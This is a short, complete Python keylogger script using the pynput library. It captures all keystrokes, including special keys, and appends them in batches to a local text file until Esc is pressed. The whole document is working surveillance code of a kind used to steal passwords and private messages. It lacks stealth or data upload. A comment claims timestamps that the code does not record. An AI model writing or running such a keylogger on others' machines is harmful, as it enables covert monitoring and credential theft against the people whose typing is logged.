from pynput.keyboard import Listener, Key
import time

# Path to the log file
log_file = "keystrokes_log.txt"
log_data = []  # List to store the keystrokes temporarily

# Function to handle each key press
def on_press(key):
    global log_data
    try:
        log_data.append(key.char)
    except AttributeError:
        # Handle special keys like space, shift, etc.
        if key == Key.space:
            log_data.append(" ")
        elif key == Key.enter:
            log_data.append("\n")
        elif key == Key.tab:
            log_data.append("[Tab]")
        elif key == Key.backspace:
            log_data.append("[Backspace]")
        else:
            log_data.append(f'[{key}]')
    
    # Periodically write to file when data size reaches a certain limit
    if len(log_data) > 10:  # Write every 10 keystrokes
        write_log()

# Function to write log data to file
def write_log():
    global log_data
    with open(log_file, "a") as log:
        log.write(f"{''.join(log_data)}")
    log_data = []  # Clear after writing

# Function to log keystrokes with timestamps
def on_release(key):
    if key == Key.esc:
        # Stop listener when 'esc' is pressed
        write_log()  # Ensure to save the last batch of keys
        return False

# Function to start the keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
